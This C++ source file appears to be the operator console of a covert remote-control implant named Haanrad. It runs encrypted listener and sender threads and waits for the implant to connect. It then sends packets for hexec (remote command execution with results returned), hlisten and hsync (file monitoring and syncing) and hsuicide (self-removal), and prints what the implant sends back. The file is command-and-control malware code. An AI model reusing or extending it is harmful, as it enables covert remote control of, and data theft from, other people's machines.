#include <iostream>
#include <cstring>
#include "MessageQueue.h"
#include "CommHandler.h"
#include "../shared/Logger.h"
#include "../shared/HCrypto.h"


void * listenBootstrapper(void * commHandlerListener){
    CommHandler * listener = (CommHandler *)commHandlerListener;
    listener->listenForMessages();
}

void * sendBootstrapper(void * commHandlerSender){
    CommHandler * sender = (CommHandler *)commHandlerSender;
    sender->processMessagesToSend();
}


Message generateHaanradPacket(string haanradCommand){

    Message message;
    message.interMessageCode = InterClientMessageType::NONE;

    string haanradPacket = "{HAAN";

    //generate the mode byte
    if(haanradCommand.find("hexec") ==0){
        //this is to execute
        unsigned char pktMode = (unsigned char)MessageType::CMD;
        message.messageType = MessageType::CMD;
        haanradPacket += pktMode;
    }else if(haanradCommand.find("hlisten") == 0){
        //this is to listen
        unsigned char pktMode = (unsigned char)MessageType::FILE;
        message.messageType = MessageType::FILE;
        haanradPacket += to_string(pktMode);
    }else if(haanradCommand.find("hsync") == 0){
        //this is to sync
        unsigned char pktMode = (unsigned char)MessageType::FILESYNC;
        message.messageType = MessageType::FILESYNC;
        haanradPacket += to_string(pktMode);
    }else if(haanradCommand.find("hsuicide") == 0){
        //this is to kill haanrad
        unsigned char pktMode = (unsigned char)MessageType::SPCCMD;
        message.messageType = MessageType::SPCCMD;
        haanradPacket += to_string(pktMode);
        haanradCommand += " hsuicide";
    }else{
        message.messageType = MessageType::INTERCLIENT;
        message.interMessageCode = InterClientMessageType::ERROR;
        return message;
    }

    //add the data
    int firstSpace = haanradCommand.find(" ");
    string parameters = haanradCommand.substr(firstSpace + 1);
    haanradPacket += parameters;
    haanradPacket += "HAAN}";

    message.data = parameters;
    message.rawCommandMessage = haanradPacket;

    return message;

}


int main() {

    cout << "==== Initializing Haanrad Console ====" << endl;
    //Logger::setDebug(true);

    //Create MessageQueue
    MessageQueue * queue = new MessageQueue();
    HCrypto * crypto = new HCrypto();

    //Create CommHandler
    // - Pass MessageQueue
    CommHandler * commHandler = CommHandler::getInstance(queue, crypto);

    pthread_t listenerThread;
    pthread_t senderThread;

    pthread_create(&listenerThread, NULL, &listenBootstrapper, commHandler);
    pthread_create(&senderThread, NULL, &sendBootstrapper, commHandler);

    //Spawn CommHandler on new Thread

    //while

        //wait for message from MessageQueue

        //print out

        //wait for input from user if message requires it (Message Can Be An Object ?)


    cout << ":> Initialization Complete" << endl;
    cout << ":> Haanrad Must Connect Before Interactivity Will Enable" << endl;

    bool haanradConnected = false;
    bool promptedHelp = false;
    bool checkQueue = false;

    while(haanradConnected == false){
        Message message = queue->recvFromHaanrad();

        if(message.interMessageCode != InterClientMessageType::EMPTY){

            if(message.messageType == MessageType::INTERCLIENT){

                switch(message.interMessageCode){
                    case InterClientMessageType::CONNECTED:{
                        cout << ":> " << message.data << endl;
                        cout << ":> " << "Enabling Interactivity" << endl;
                        haanradConnected = true;
                        break;
                    }
                }
            }

        }
    }

    //at this point haanrad has connected and interactive mode is possible
    while(1){

        if(promptedHelp == false){
            cout << ":> Interactivity Has Been Enabled. The Following KeyWords Are Available:" << endl;
            cout << ":> \t send <command>\t\tSend A Command To Haanrad Using Valid Haanrad Commands" << endl;
            cout << ":> \t check \t\t\t\tCheck For New Messages Sent From Haanrad. This Includes Command Results Or File Events" << endl;
            promptedHelp = true;
        }

        Message message;
        message.messageType = MessageType::DUD;
        if(checkQueue == true){
            message = queue->recvFromHaanrad();
            checkQueue = false;

        }

        //if the InterClientCode is EMPTY then we know a check occurred (default value is NONE)
        if(message.interMessageCode == InterClientMessageType::EMPTY){
            cout << ":> Check Complete. There Are No Messages From Haanrad" << endl;
        }else{
            if(message.interMessageCode == InterClientMessageType::ERROR){
                cout << ":> An Error Message Was Found. Details: " << message.data << endl;
            }

            if(message.messageType == MessageType::CMDANSWER){
                cout << ":> An hexec command has returned. The Results Are:" << endl;
                cout << ":> ==== Start Of Transmission ====" << endl;
                cout << ":> " << message.data << endl;
                cout << ":> ====  End Of Transmission  ====" << endl;
            }
        }
        //additional checks if something does arrive...



        //now can get user input again
        int BUFFERLEN = 1024;
        char BUFFER[BUFFERLEN];
        memset(BUFFER, '\0', BUFFERLEN);

        cout << ":> ";
        fgets(BUFFER, BUFFERLEN, stdin);
        string command(BUFFER);
        command.erase(command.length() - 1); //remove the \n character

        if(command.find("send") != 0 && command.find("check") != 0){
            cout << ":> Invalid Command Entered. Cannot Process" << endl;
            promptedHelp = false;
            continue;
        }

        //if send then send this command
        if(command.find("send") == 0){
            cout << ":> Queueing Message To Be Sent To Haanrad" << endl;
            string haanradCommand = command.substr(5);

            Message message = generateHaanradPacket(haanradCommand);
            if(message.interMessageCode == InterClientMessageType::ERROR){
                cout << ":> Command Format Invalid. Could Not Send Message to Haanrad" << endl;
                continue;
            }

            //add the message to the Queue
            queue->sendToHaanrad(message);
            cout << ":> Message Queued To Be Sent. Use the check command to check for responses" << endl;
            continue;

        }

        //if check command look for new data
        if(command.find("check") == 0){
            cout << ":> Checking For New Messages" << endl;
            checkQueue = true;
            continue;
        }


    }

    return 0;
}